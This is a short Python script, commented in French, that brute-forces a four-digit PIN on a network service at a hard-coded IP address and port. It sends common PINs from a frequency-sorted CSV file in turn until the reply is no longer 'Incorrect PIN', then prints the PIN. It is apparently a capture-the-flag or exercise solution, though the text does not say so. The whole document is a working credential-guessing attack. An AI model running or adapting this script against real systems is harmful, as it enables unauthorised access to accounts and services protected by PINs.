import os, sys, socket, csv

server = "51.195.253.124"
port = 12345

ma_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    ma_socket.connect((server, port))
except Exception as e:
    print("Problème de connexion", e.args)
    sys.exit(1)

ligne = ma_socket.recv(1024)
print(ligne)

with open('four-digit-pin-codes-sorted-by-frequency-withcount.csv', newline='') as csvfile:
    spamreader = csv.reader(csvfile, delimiter=',')
    for pin, _ in spamreader:
        ma_socket.sendall(bytes(pin, 'utf-8'))
        ligne = str(ma_socket.recv(1024))
        if not ligne.startswith('b\'Incorrect PIN'):
            print(f"PIN FOUND : {pin}")
            print(ligne)
            break